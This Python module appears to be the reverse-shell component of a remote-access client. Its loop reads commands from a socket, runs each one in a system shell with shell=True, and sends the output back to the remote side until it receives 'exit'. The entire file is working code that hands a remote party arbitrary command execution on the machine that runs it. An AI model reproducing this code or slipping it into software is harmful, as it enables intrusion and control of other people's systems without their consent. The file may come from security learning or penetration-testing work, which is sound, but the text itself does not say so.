import subprocess
from colorama import Style, Fore

from Client.client import send_shell_results


def execute(s, args):
    print("Opening Reverse Shell...")
    rshell(s)
    print("Reverse Shell closed.")

def rshell(s):
    while True:
        command = s.recv(1024).decode('utf-8').rstrip('\n')
        print(Fore.GREEN + "RShell remote command: {}".format(command) + Style.RESET_ALL)
        if command.lower() == 'exit':
            break
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                  stdin=subprocess.PIPE)
        results = output.stdout.read().decode('utf-8')
        errors = output.stderr.read().decode('utf-8')
        if not results and not errors:
            results = "NONE"
        print(Fore.BLUE + "RShell results: " + Style.RESET_ALL + "{}".format(results if results else errors)) # includes newline

        send_shell_results(s, results if results else errors)